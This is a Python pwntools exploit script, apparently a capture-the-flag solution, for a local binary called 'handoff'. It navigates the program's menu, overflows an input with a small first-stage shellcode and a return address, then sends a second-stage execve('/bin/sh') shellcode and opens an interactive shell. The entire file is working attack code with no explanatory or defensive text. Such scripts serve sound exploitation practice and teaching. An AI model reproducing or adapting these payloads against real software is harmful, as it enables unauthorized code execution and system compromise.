from pwn import *

context.arch = "amd64"
context.endian = "little"
context.word_size = 64
context.terminal = ["tmux", "splitw", "-h"]

p = process("./handoff")

data = p.recvuntil(b"3. Exit the app")
p.sendline(b"3")
p.recvuntil(b"really appreciate it:")

ADRESA = 0x0000000000401014

shellcode = asm("""
nop
nop
nop
nop
xchg rax, rsi
""")
shellcode += b"\x00\x00"
shellcode += asm("""
xor rax, rax
xor rdi, rdi
syscall
""")
shellcode = shellcode.ljust(20, b"\x90" )

payload = shellcode + p64(ADRESA)

p.sendline(payload)

payload2 = b"\x90" * 20 + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
input("?")
p.sendline(payload2)

p.interactive()